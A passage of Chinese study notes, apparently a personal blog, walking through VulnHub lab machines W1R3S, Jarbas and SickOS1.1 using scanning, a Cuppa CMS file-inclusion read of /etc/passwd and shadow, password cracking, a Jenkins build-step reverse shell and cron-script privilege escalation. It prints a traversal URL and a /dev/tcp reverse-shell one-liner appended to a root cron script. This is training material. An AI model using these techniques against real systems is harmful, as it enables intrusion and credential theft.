+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131856.png" alt="image-20251022185859791"></p>
+<p><strong>没有</strong></p>
+<p>**看源码 F12   **<strong>注意注释</strong>找找有没有信息</p>
+<h3 id="2-目录爆破（gobuster）-也可以-dirb"><a href="#2-目录爆破（gobuster）-也可以-dirb" class="headerlink" title="2.目录爆破（gobuster）&#x2F;也可以 dirb"></a>2.目录爆破（gobuster）&#x2F;也可以 dirb</h3><p><strong>没有的下载</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131857.png" alt="image-20251022190307590"></p>
+<p><strong>kali 自带的，目录爆破经常使用 medium</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131858.png" alt="image-20251022190430929"></p>
+<p><strong>运行出来的结果可以直接打开看看，比如这个 javascript 就是不允许访问，只能了解是 apache 跑的 Ubuntu 系统</strong></p>
+<p><strong>访问 wordpress 发现跳转到 host&#x2F;wordpress  （解决办法，下面有，先看看）</strong></p>
+<p><strong>访问 administrator，可以访问，看到是一个程序的安装，页面标题显示 cappa CMS</strong><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131859.png" alt="image-20251022190850162"></p>
+<p><strong>目前有两个入手点 wordpress（先  常见，易于找漏洞版本攻击）和  cappa CMS（后）</strong></p>
+<h4 id="先看-wordpress"><a href="#先看-wordpress" class="headerlink" title="先看 wordpress"></a>先看 wordpress</h4><p><strong>因为会自动跳转到 localhost 里面，那么试试 vim 修改 host 文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131860.png" alt="image-20251022191432951"></p>
+<p><strong>用于校验，但是输入两个域名还是不行</strong></p>
+<blockquote>
+<p><strong>把 WordPress 的 <code>siteurl</code> 和 <code>home</code> 改成你实际访问的地址 <code>http://11.11.11.11/wordpress</code> 即可解决跳转问题。？？</strong></p>
+</blockquote>
+<h4 id="再看-cappa-CMS"><a href="#再看-cappa-CMS" class="headerlink" title="再看 cappa  CMS"></a>再看 cappa  CMS</h4><p><strong>注意这是渗透测试</strong></p>
+<p><strong>因为是安装，点了 NEXT 会不会对原机器有什么改变，就算真有也要点，因为走到这里了，就是之后****不可控也要想到，有预期的</strong></p>
+<p>**进去以后是配置页，数据库和管理员信息[?]可以看 default 默认信息 **</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131861.png" alt="image-20251022194016730"></p>
+<p><strong>你发现这里有一个****独特的错误字符</strong>“databas”   那么就可以去网上搜了（有没有相应版本之类的），点了之后会有什么影响（让管理员发现？不可逆的服务器修改？）</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131862.png" alt="image-20251022194143684"></p>
+<p><strong>评估以后我们认为还是要安装，之后能不能给我一个可以登陆的后台，有可能我就能获得基于他所用的技术栈中执行反弹 shell 的机会</strong></p>
+<p><strong>可是安装了但也进不去，交互的按钮只有 back</strong></p>
+<p><strong>走不下去了</strong></p>
+<p><strong>看源码，没有泄漏 CMS 的版本，敏感信息…</strong></p>
+<p><strong>作为一个大的内容管理系统，思考有没有什么公开漏洞</strong></p>
+<p><strong>searchsploit cuppa cms          发现只有一条数据（几条无所谓，只影响筛查难度）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131863.png" alt="image-20251022195334326"></p>
+<p><strong>这是搜索该漏洞数据库中的信息（没有联网，必要时手动更新）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131864.png" alt="image-20251022195159429"></p>
+<p><strong>-m 镜像（mirror）到一个文件中（任意命名，这里是 25971）</strong></p>
+<p><strong>发现是****文件包含类型的漏洞</strong>，下面是漏洞所在目录和位置</p>
+<p><strong>漏洞可能的影响，看不懂 ai</strong></p>
+<p><strong>攻击方式：有远程包含和 passwd 的读取，               还可以访问 php 的源码通过 php 的字节流&#x2F;跟着例子呢</strong></p>
+<p><a target="_blank" rel="noopener" href="https://jishuzhan.net/article/1887000809464401922">渗透测试之文件包含漏洞 超详细的文件包含漏洞文章 - 技术栈</a></p>
+<p><strong>进行验证漏洞的存在</strong></p>
+<p><strong>先把 target 后面的内容复制粘贴试试（文件所在位置不确定）</strong></p>
+<p><strong>发现不对，分析一下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131865.png" alt="image-20251022200344552"></p>
+<p><strong>alert 肯定要有的，会不会是前面 cuppa 要替换呢？&#x2F;administrator</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.21/cuppa/alerts/alertConfigField.php?</span><br><span class="line">urlConfig=./.../.../ .../.../ ../.../ ../.../etc/passwd</span><br><span class="line"></span><br><span class="line">http://10.10.10.21/administrator/alerts/alertConfigField.php?</span><br><span class="line">urlConfig=./.../.../ .../.../ ../.../ ../.../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>发现有反应了，但是没有泄漏出 passwd ，源码也没有</strong></p>
+<p><strong>分析：”urlConfig”是作为一个参数给过来的，一般来说，作为参数是用 get 方式来处理数据的，但不一定有没有可能是 post</strong></p>
+<p><strong>而漏洞利用里面有使用 base64 编码的内容</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131866.png" alt="image-20251022200958080"></p>
+<p><strong>可以猜测是 post，要不你也可以下载漏洞利用里面给的第三方源码进行代码审计或者自己****去网上搜源码</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131867.png" alt="image-20251022201131866"></p>
+<p><strong>我们之前确定了漏洞位置</strong></p>
+<p><strong>可以从相应目录的文件的源码（github）中找，发现他是用 POST 传递，并没有做任何处理</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131868.png" alt="image-20251022201428181"></p>
+<p><strong>利用 curl 查看帮助对数据进行 url 编码并且通过 POST 方式进行传递</strong></p>
+<p><strong>复制过来，将变量”urlConfig”的内容通过 url 编码给到处理程序看是否可以执行，也符合刚才源码审计使用 post 的内容</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131869.png" alt="image-20251022202239115"></p>
+<p><strong>看到已经列出来了 passwd 的内容</strong></p>
+<p><strong>每个用户的：后都是 x 说明密码都是以 hash 的方式存在了 shadow 文件中，所以立刻回去找 shadow 文件看能否读取（要清楚目录结构）</strong></p>
+<p><strong>发现没有问题可以读取</strong></p>
+<p><strong>这样就变成了把这些 hash 拿下来破解的渗透思路，将没有 hash 值的用户删掉，保留有 hash 值的</strong></p>
+<p><strong>丢给 john 破解，先直接丢给他，不行再设计复杂参数</strong></p>
+<p><strong>一般来说，运维的时候 www 账号都是一个功能性账号，相比来说 wires 用户权限可能更高，但 root 肯定是最高的，但暂时还没出来</strong></p>
+<p><strong>先看 w1r3s</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh w1r3s@10.10.10.21          密码上张图：computer </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131870.png" alt="image-20251022203143012"></p>
+<p><strong>可以看到登陆成功，查看 id 和操作系统的情况       因为有 sudo 的权限，那么可以看看能否提权</strong></p>
+<p><strong>提权的第一步是看 sudo -l 看当前用户有哪些系统级权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131871.png" alt="image-20251022204002048"></p>
+<p><strong>发现 ALL，那么当前用户有全部的权限 基本上等于 root</strong></p>
+<p>**接下来就以 sudo 的权限来执行 bash 会话，看到# 提权成功 **</p>
+<p><strong>可以看到账号名称（root）；操作系统情况 ；ip 地址就是靶机（10.10.10.21）   没错</strong></p>
+<p><strong>最后找 flag</strong></p>
+<p><strong>cd 到根目录下，ls 发现有 flag.txt    cat 即可</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131872.png" alt="image-20251022204512502"></p>
+<h2 id="五，22-端口暴力破解-ssh"><a href="#五，22-端口暴力破解-ssh" class="headerlink" title="五，22 端口暴力破解 + ssh"></a>五，22 端口暴力破解 + ssh</h2><p><strong>最后测，只要一处突破就可以了</strong></p>
+<p><strong>先 vim 创建一个 user.list  里面填上 username</strong></p>
+<p>**   可以把找到泄漏的都写上 **</p>
+<p><strong>-t 是 线程对应用户名数量？</strong></p>
+<p><strong>rockyou 密码本破解国外很常见</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131873.png" alt="image-20251022204813218"></p>
+<p><strong>同样成功</strong></p>
+<h2 id="六，总结"><a href="#六，总结" class="headerlink" title="六，总结"></a>六，总结</h2><p><strong>nmap 扫描（不要忽略 udp 和 IPv6）获得了系统的四个端口 21，22，80，3306，具体应该怎么选，优先级不要忽略 udp 和 IPv6</strong></p>
+<p><strong>先看匿名登陆的 ftp 获得了若干的文本文件，逐一查看，该破解的破解，该做字符在处理的做字符处理，本次无用但是****这是思路，必须全面走完</strong></p>
+<p><strong>22 端口：简单评估，没想要他怎么样，用 ftp 中获得的关键字设计简易的用户字典，用 rockyou 密码库进行了破解成功获取登录权限，提权</strong></p>
+<p><strong>边做边记录</strong></p>
+<h1 id="JARBAS-Jenkins-渗透原理详解，一个典型-CMS-渗透测试样本。（尝试其他漏洞？）"><a href="#JARBAS-Jenkins-渗透原理详解，一个典型-CMS-渗透测试样本。（尝试其他漏洞？）" class="headerlink" title="JARBAS - Jenkins 渗透原理详解，一个典型 CMS 渗透测试样本。（尝试其他漏洞？）"></a>JARBAS - Jenkins 渗透原理详解，一个典型 CMS 渗透测试样本。（尝试其他漏洞？）</h1><blockquote>
+<p><strong>CMS 是 Content Management System 的缩写,意为”内容管理系统”它是一种用于创建、编辑、组织和发布内容的软件工具或平台。</strong></p>
+<p><strong>通过 CMS，用户可以轻松地管理网站或应用程序的内容，而无需编写复杂的代码。它提供了一个用户友好的界面，使非技术人员也能够直观地添加、编辑和删除内容，包括文本、图像、视频等。</strong></p>
+<p><strong>常见的 CMS 包括 WordPress、Joomla、Drupal、Magento 等。这些 CMS 提供了丰富的功能和扩展性，可以根据用户的需求进行定制和扩展。它们通常提供模板系统，允许用户选择和应用各种设计样式，从而快速构建具有独特外观和布局的网站。</strong></p>
+<p><strong>CMS 还支持多用户协作，允许多个用户同时参与内容的创建和管理。它们提供了权限管理、版本控制、评论系统等功能，以便团队成员之间的协作和交流。</strong></p>
+<p><strong>总的来说，CMS 是一种方便管理和发布内容的工具或平台，使网站和应用程序的维护变得简单和高效。它们广泛应用于个人博客、新闻门户、企业网站、电子商务平台等各种类型的网站和应用程序。</strong></p>
+</blockquote>
+<h2 id="一，nmap-扫描"><a href="#一，nmap-扫描" class="headerlink" title="一，nmap 扫描"></a>一，nmap 扫描</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131874.png" alt="image-20251025125516280"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h3 id="详细信息扫描"><a href="#详细信息扫描" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p><strong>，全关闭</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131875.png" alt="image-20251025125940091"></p>
+<h3 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h3><p><strong>22 后</strong></p>
+<p><strong>80 端口（重点</strong></p>
+<p><strong>枚举发现了  icons   这个潜在目录</strong></p>
+<p><strong>8080 发现了 robots.txt 这个目录文件（重点</strong></p>
+<p><strong>数据库在其他过程中看</strong></p>
+<h2 id="二，web-渗透"><a href="#二，web-渗透" class="headerlink" title="二，web 渗透"></a>二，web 渗透</h2><h3 id="进入网页，验证扫描出来的信息"><a href="#进入网页，验证扫描出来的信息" class="headerlink" title="进入网页，验证扫描出来的信息"></a>进入网页，验证扫描出来的信息</h3><h3 id="看各端口对应的页面"><a href="#看各端口对应的页面" class="headerlink" title="看各端口对应的页面"></a>看各端口对应的页面</h3><p><strong>先看一下 8080 端口是什么</strong></p>
+<p><strong>管理端登录界面：</strong></p>
+<p><strong>1.弱密码</strong></p>
+<p><strong>2.默认密码（在网上找 ）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131876.png" alt="image-20251025130755237"></p>
+<h3 id="看一下-robots-txt-目录"><a href="#看一下-robots-txt-目录" class="headerlink" title="看一下 robots.txt 目录"></a>看一下 robots.txt 目录</h3><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p><strong>出现 web 了，那么我们在浏览 web 的同时进行目录爆破，没什么有用信息</strong></p>
+<p><strong>gobuster</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131877.png" alt="image-20251025131401899"></p>
+<p><strong>直接扫没看出有什么东西</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131878.png" alt="image-20251025131429599"></p>
+<p><strong>加扩展名（看目标站可能的扩展名）</strong></p>
+<h3 id="访问-access-html，发现加密的凭据"><a href="#访问-access-html，发现加密的凭据" class="headerlink" title="访问&#x2F;access.html，发现加密的凭据"></a>访问&#x2F;access.html，发现加密的凭据</h3><p><strong>被加密的凭据：</strong></p>
+<p><strong>应该是 MD5</strong></p>
+<p><strong>前面是用户名，后面是被加密的密码</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131879.png" alt="image-20251025131819553"></p>
+<p><strong>可以用 hash-identifier 识别</strong></p>
+<p><strong>可以用各种网站在线工具 md5 crack</strong></p>
+<h3 id="尝试登录"><a href="#尝试登录" class="headerlink" title="尝试登录"></a>尝试登录</h3><p><strong>来登录 8080</strong></p>
+<p><strong>使用 tiago 失败，其他也是失败…</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131880.png" alt="image-20251025132448513"></p>
+<p><strong>结果是因为：这里 eder 对应的 md5 解码就是 vipsu，解码网站结果排序和输入的 md5****排序</strong>不一样。（你可以详细对照一下）</p>
+<p><strong>进入后的页面</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131881.png" alt="image-20251025132801276"></p>
+<p><strong>Jenkins 是一套著名的内容管理系统，是一个持续集成的工具</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/106544050">jenkins 漏洞集合 简介_cve-2018-1000600-CSDN 博客</a></p>
+<h3 id="利用漏洞，尝试获取初级系统权限"><a href="#利用漏洞，尝试获取初级系统权限" class="headerlink" title="利用漏洞，尝试获取初级系统权限"></a>利用漏洞，尝试获取初级系统权限</h3><p>**点击左上角的 New Item **</p>
+<p><strong>输入任务名，然后试试 freestyle，划到最下方 OK</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131882.png" alt="image-20251025133508671"></p>
+<p><strong>选 build</strong></p>
+<p><strong>写一条 bash 交互的脚本，然后 save</strong></p>
+<p><strong>为了得到反弹 shell，在自己机器上打开监听</strong></p>
+<p><strong>因为我们刚才建立了一个项目那我们点击****build now</strong> 的时候，就应该是构建我们刚才那个项目，而哪里项目里面写了我们反弹 shell 的 payload   Jenkins 这个漏洞屡试不爽，很少有人修补（其他还有很多，但这个是最先要尝试的）</p>
+<p><strong>此时我们可以看到在自己的 kali 上反弹了 shell</strong></p>
+<p><strong>看看 shell 的权限，发现很多命令东都不能用</strong></p>
+<blockquote>
+<h3 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a><code>uname -a</code></h3><ul>
+<li><strong>作用</strong>：显示系统的详细信息，包括内核名称、主机名、内核版本、硬件架构等。</li>
+</ul>
+<h3 id="ip-a"><a href="#ip-a" class="headerlink" title="ip a"></a><code>ip a</code></h3><ul>
+<li><strong>作用</strong>：显示所有网络接口的 IP 地址和状态（<code>ip address show</code> 的简写）。</li>
+</ul>
+<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a><code>ifconfig</code></h3><ul>
+<li><strong>作用</strong>：传统的网络配置工具，用于查看和配置网络接口（在新系统中已被 <code>ip</code> 命令取代）。</li>
+</ul>
+<h3 id="dpkg-l"><a href="#dpkg-l" class="headerlink" title="dpkg -l"></a><code>dpkg -l</code></h3><ul>
+<li><strong>作用</strong>：列出系统中所有已安装的 Debian 软件包（用于基于 Debian 的系统，如 Ubuntu）。</li>
+</ul>
+<h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a><code>sudo -l</code></h3><ul>
+<li><strong>作用</strong>：列出当前用户可以使用 <code>sudo</code> 执行的命令。</li>
+</ul>
+<p><strong>cat &#x2F;etc&#x2F;passwd****列出系统上所有用户账户的基本信息</strong>，看看哪些用户有 shell 环境</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>用户名</strong></th>
+<th><strong>Shell 路径</strong></th>
+<th><strong>备注说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>root</code></td>
+<td><code>/bin/bash</code></td>
+<td><strong>超级管理员，默认有完整 shell</strong></td>
+</tr>
+<tr>
+<td><code>sync</code></td>
+<td><code>/bin/sync</code></td>
+<td>**特殊用途，执行同步命令后立即退出，**<strong>不是交互 shell</strong></td>
+</tr>
+<tr>
+<td><code>shutdown</code></td>
+<td><code>/sbin/shutdown</code></td>
+<td>**特殊用途，执行关机命令后退出，**<strong>不是交互 shell</strong></td>
+</tr>
+<tr>
+<td><code>halt</code></td>
+<td><code>/sbin/halt</code></td>
+<td>**特殊用途，执行停机命令后退出，**<strong>不是交互 shell</strong></td>
+</tr>
+<tr>
+<td><code>eder</code></td>
+<td><code>/bin/bash</code></td>
+<td><strong>普通用户，具备完整 bash shell 登录能力</strong></td>
+</tr>
+</tbody></table>
+<p><strong>虽然 <strong><code>sync</code>、<code>shutdown</code>、<code>halt</code> 的 shell 不是 <code>/sbin/nologin</code>，但它们</strong>不是用于交互登录</strong>的，而是系统服务账户，执行完命令就退出，<strong>不能视为“可登录用户”</strong>。</p>
+<ul>
+<li><code>root</code></li>
+<li><code>eder</code></li>
+</ul>
+<p>**全都使用 **<code>/sbin/nologin</code> 或 <code>/bin/false</code>，<strong>无法登录系统</strong>，仅用于运行服务或守护进程。</p>
+<p><strong>访问 shadow 无权限</strong></p>
+<p><strong>我们这是****部分</strong>交互式 shell <img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131883.png" alt="image-20251025142203710"></p>
+<p><strong>其他提权路径的尝试</strong></p>
+<h2 id="三，crontab-自动任务提权"><a href="#三，crontab-自动任务提权" class="headerlink" title="三，crontab 自动任务提权"></a>三，crontab 自动任务提权</h2><p><strong>我们先看看系统有没有自动任务：</strong></p>
+<p>**cat &#x2F;etc&#x2F;crontab  **</p>
+<p>**（**<strong>一般</strong>来说自动任务会有 crontab 这个文件，也可能是其他文件，需要一个个试试比如：</p>
+<p><strong>cron.d</strong><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131884.png" alt="image-20251025142553916">)</p>
+<p><strong>发现有这个文件</strong></p>
+<p><strong>其中每五分钟以 root 的权限，将…sh 这个脚本的执行结果把他扔掉</strong></p>
+<p><strong>我们可以看看这里面写了什么</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131885.png" alt="image-20251025142946793"></p>
+<p><strong>我们可以把自己的脚本追加到这个里面或者直接替换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.3/4443 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleanigScript.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>将 “以交互式启动一个 shell，重定向到 10.10.10.3 的 4443 端口（注意与之前那个端口区分）”  追加到自动任务脚本里面</strong></p>
+<p>**然后开启监听  **<img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131886.png" alt="image-20251025143743344"></p>
+<p><strong>最后反弹 shell 成功</strong></p>
+<p><strong>获取 flag</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131887.png" alt="image-20251025144832829"></p>
+<h1 id="SickOS1-1-穿越-Squid-代理的-CMS-渗透-解法一"><a href="#SickOS1-1-穿越-Squid-代理的-CMS-渗透-解法一" class="headerlink" title="SickOS1.1 - 穿越 Squid 代理的 CMS 渗透-解法一"></a>SickOS1.1 - 穿越 Squid 代理的 CMS 渗透-解法一</h1><p><strong>靶机精讲之 SickOS1.1，</strong><a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=vulnhub&seid=13585957088443507563&from_avid=688959450&from_comid=161743446896">vulnhub</a>靶机，需要配置代理，穿越<a target="_blank" rel="noopener" href="https://search.bilibili.com/all?from_source=webcommentline_search&keyword=Squid&seid=13585957088443507563&from_avid=688959450&from_comid=161743446896"><img src="https://i0.hdslb.com/bfs/reply/9f3ad0659e84c96a711b88dd33f4bc2e945045e0.png" alt="img">Squid</a>实现对 CMS 渗透，完整的攻击链，对基本功要求比较高，不难，但也需要全局观和细节操作。能顺利完成本机渗透，也证明你在不断进步。此为方法一，本机还有全然不同的第二种打法</p>
+<h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><h3 id="主机发现-1"><a href="#主机发现-1" class="headerlink" title="主机发现"></a>主机发现</h3><p><strong>多出来的 19 即为靶机</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo namp -sn 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131888.png" alt="image-20251027165055148"></p>
+<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>**22ssh   3128squid-http  **</p>
+<p><strong>8080 关闭的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 10.10.10.19</span><br></pre></td></tr></table></figure>
+
+<h3 id="详细信息扫描-1"><a href="#详细信息扫描-1" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><p><strong>虽然 8080 端口未开放，但鉴于能扫出来端口，那么我们扫详细信息的时候也带上，说不定有额外信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,3128,8080 10.10.10.19</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131889.png" alt="image-20251027170421767"></p>
+<h3 id="UDP-扫描-1"><a href="#UDP-扫描-1" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p><strong>不用指定端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 10.10.10.19    #--top-ports是指扫描 前20个常见端口</span><br><span class="line">sudo nmap -sU  10.10.10.19</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131890.png" alt="image-20251027171029400">    存异，可能开了也可能被过滤掉了</p>
+<h3 id="漏洞脚本扫描"><a href="#漏洞脚本扫描" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script-vuln -p22,3128,8080 10.10.10.19</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>**22 端口很少直接攻击（暴力破解）     只有拿到  凭据：用户名密码   **</p>
+<p><strong>3128 端口 squid http proxy</strong></p>
+<p><strong>8080 端口关闭了，意义不大，但 nmap 还是提示了是一个 proxy 代理</strong></p>
+<p><strong>多处信息提示了，这台靶机有****代理</strong></p>
+<h2 id="Squid-代理分析与设置"><a href="#Squid-代理分析与设置" class="headerlink" title="Squid 代理分析与设置"></a>Squid 代理分析与设置</h2><p><strong>因为是 http-proxy</strong></p>
+<p><strong>那么打开 web 界面看看</strong></p>
+<h3 id="web-界面查看"><a href="#web-界面查看" class="headerlink" title="web 界面查看"></a>web 界面查看</h3><p><strong>访问 3128 页面，提示 error   下面还泄露了 squid 版本信息  ，</strong></p>
+<p>**  **<strong>webmaster</strong> 查看源码</p>
+<p><strong>邮箱 被 url 编码 %20</strong></p>
+<p><strong>作用是给管理员发邮件，看起来没什么太大用（能否看到管理员邮箱进行钓鱼？）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131891.png" alt="image-20251027172449632"></p>
+<h3 id="什么是-squid"><a href="#什么是-squid" class="headerlink" title="什么是 squid"></a>什么是 squid</h3><p>**搜一下 squid 3.1.19       看到是一个 **<strong>代理服务器</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131892.png" alt="image-20251027172837438"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131893.png" alt="image-20251027172934271"></p>
+<p><strong>一定是 3128 这个端口代理了什么东西</strong></p>
+<p><strong>那么怎么用呢？</strong></p>
+<p><strong>路径一：代理服务器怎么用</strong></p>
+<p><strong>路径二：目录爆破</strong></p>
+<h3 id="目录爆破-1"><a href="#目录爆破-1" class="headerlink" title="目录爆破"></a>目录爆破</h3><p><strong>dirb&#x2F;gobuster</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://10.10.10.19:3128/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131894.png" alt="image-20251027173429247"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster dir -u http://10.10.10.19:3128 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131895.png" alt="image-20251027173525621"></p>
+<p><strong>服务器状态码不行</strong></p>
+<p><strong>可能是因为代理   或者 WAF（防火墙）阻断了 ，无法进行爆破</strong></p>
+<h3 id="将-3128-作为代理进行爆破扫描"><a href="#将-3128-作为代理进行爆破扫描" class="headerlink" title="将 3128 作为代理进行爆破扫描"></a>将 3128 作为代理进行爆破扫描</h3><p><strong>因为****代理的作用</strong>就是<strong>流量转发</strong>，这本身就是一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://10.10.10.19 -p http://10.10.10.19:3128</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看到发现了许多可用目录（状态码 200，其他也可以试试）</strong></p>
+<h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><strong>因为我们刚才 dirb 扫描的时候是用的代理，那么我们在 web 服务器中访问也要使用代理</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131896.png" alt="image-20251027174601696"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131897.png" alt="image-20251027174748816"></p>
+<h2 id="WEB-渗透"><a href="#WEB-渗透" class="headerlink" title="WEB 渗透"></a>WEB 渗透</h2><h3 id="访问-3128-端口及其子目录"><a href="#访问-3128-端口及其子目录" class="headerlink" title="访问 3128 端口及其子目录"></a>访问 3128 端口及其子目录</h3><p><strong>设完代理后的访问</strong></p>
+<p><strong>不知道的可以搜</strong></p>
+<h4 id="robots"><a href="#robots" class="headerlink" title="&#x2F;robots"></a><strong>&#x2F;robots</strong></h4><p><strong>非常有价值，证明我们走这个路是正确的</strong></p>
+<p><strong>对一个网站，看他的 robots 文件非常有用</strong></p>
+<blockquote>
+<p>**这段内容是一个网站的 **<strong>robots.txt</strong> 文件，它的作用是告诉搜索引擎的爬虫（也叫“机器人”或“bot”）哪些页面可以抓取，哪些不可以。</p>
+<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><ol>
+<li><strong>User-agent: *</strong>*<strong>*</strong> <strong>表示这条规则适用于</strong>所有搜索引擎爬虫**（比如 Google、Bing、百度等）。</li>
+<li><strong>Disallow: &#x2F;</strong> <strong>表示****禁止抓取整个网站的所有内容</strong>。** **也就是说，这个网站不希望被任何搜索引擎收录。</li>
